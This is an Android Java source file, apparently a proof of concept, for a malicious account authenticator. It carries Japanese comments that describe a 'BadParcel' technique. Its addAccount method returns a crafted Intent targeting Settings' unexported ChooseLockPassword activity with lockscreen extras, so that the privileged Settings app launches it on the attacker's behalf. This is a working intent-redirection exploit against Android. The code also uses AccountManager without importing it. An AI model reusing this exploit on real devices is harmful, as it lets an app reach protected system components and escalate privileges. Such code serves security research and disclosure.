package com.example.dpmpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    private static final String TAG = "MyAuthenticator";

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {

        // ---- 悪意の Bundle 構築（BadParcel テクニック） ----
        // DpmServiceApp を起動する Intent を埋め込む（実際は Service 起動不可）
        // ここでは Activity 起動用に Intent を設定 (ChooseLockPassword は未エクスポートだが、Settings 権限で起動可能)
        Intent evilIntent = new Intent();
        // 目的: DpmServiceApp を起動したいが、Service は Intent で startActivity できない。
        // 代わりに、Settings の Activity を起動し、その Activity がサービスを起動するよう誘導（不可能）
        // ここでは単に既存の未エクスポート Activity を起動するデモ
        evilIntent.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.password.ChooseLockPassword"));
        evilIntent.putExtra("lockscreen.biometric_weak_fallback", true);
        evilIntent.putExtra("lockscreen.password_type", 0x20000);

        Bundle bundle = new Bundle();
        // 標準的な方法で Intent を Bundle に詰める (KEY_INTENT)
        bundle.putParcelable(AccountManager.KEY_INTENT, evilIntent);

        // さらに、手動 Parcel 構築で他のフィールドを追加することも可能（BadParcel の高度版）
        // 今回はシンプルに標準 API を使用（多くの場合有効）

        Log.d(TAG, "BadParcel Bundle 構築完了");

        // この Bundle が Settings に返され、Settings が evilIntent を起動する。
        // その際、Settings はシステム権限を持つため、ChooseLockPassword（未エクスポート）が起動可能。
        // もし DpmServiceApp を Service として起動したければ、別の仕組みが必要。
        return bundle;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response,
                                     Account account, Bundle options) {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response,
                               Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response,
                                    Account account, String authTokenType, Bundle options) {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response,
                              Account account, String[] features) {
        return null;
    }
}
